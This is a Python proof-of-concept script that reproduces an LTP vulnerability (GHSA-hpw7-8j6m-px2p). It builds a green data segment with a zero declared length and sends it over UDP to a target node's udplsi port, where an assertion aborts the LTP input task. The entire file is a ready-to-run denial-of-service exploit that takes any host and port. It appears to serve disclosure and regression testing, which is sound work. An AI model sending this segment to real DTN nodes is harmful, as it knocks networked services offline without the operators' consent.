#!/usr/bin/env python3
#
# send_green_segment.py HOST PORT [ENGINE]
#
# Send one crafted LTP green data segment with a declared data length of zero to
# the udplsi UDP port, reproducing GHSA-hpw7-8j6m-px2p: handleGreenDataSegment()
# passes the wire-supplied length to sdr_insert(), whose allocator rejects a zero
# size with an assertion that aborts the LTP input task.
#
# LTP data-segment wire format (RFC 5326), all multi-byte fields SDNV:
#   control byte = (version << 4) | segment type code   (version 0, green = 0x04)
#   session originator (engine ID) SDNV
#   session number SDNV
#   extension counts byte = (header count << 4) | trailer count
#   client service ID SDNV
#   offset SDNV
#   length SDNV
#   ... data ...
#
# ENGINE is the session originator engine ID and must be an engine the target
# node has a span to (default 1).  In the two-node test the target is node 3 and
# the segment claims to come from its peer engine 2.  Client service ID 1 is
# BpLtpClientId, which ltpcli registers; length 0 is the malicious field.

import socket
import sys


def sdnv(value):
    """Encode a non-negative integer as an SDNV (RFC 5326)."""
    if value < 0:
        raise ValueError("SDNV cannot encode a negative value")
    groups = [value & 0x7F]
    value >>= 7
    while value:
        groups.append((value & 0x7F) | 0x80)
        value >>= 7
    return bytes(reversed(groups))


def main():
    if len(sys.argv) not in (3, 4):
        sys.stderr.write("usage: send_green_segment.py HOST PORT [ENGINE]\n")
        return 1

    host = sys.argv[1]
    port = int(sys.argv[2])
    engine = int(sys.argv[3]) if len(sys.argv) == 4 else 1

    # Session number 1000000 is high so it does not collide with a closed
    # session created by ordinary loopback traffic.
    segment = (
        bytes([0x04])          # control: version 0, type LtpDsGreen (EXC flag)
        + sdnv(engine)         # session originator engine ID (span peer)
        + sdnv(1000000)        # session number
        + bytes([0x00])        # extension counts: no header/trailer extensions
        + sdnv(1)              # client service ID = 1 (BpLtpClientId, ltpcli)
        + sdnv(0)              # offset = 0
        + sdnv(0)              # length = 0   <-- zero-length green segment
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(segment, (host, port))
    finally:
        sock.close()

    sys.stderr.write(
        f"sent {len(segment)}-byte zero-length green LTP segment "
        f"(engine {engine}) to {host}:{port}\n"
    )
    return 0


if __name__ == "__main__":
    sys.exit(main())
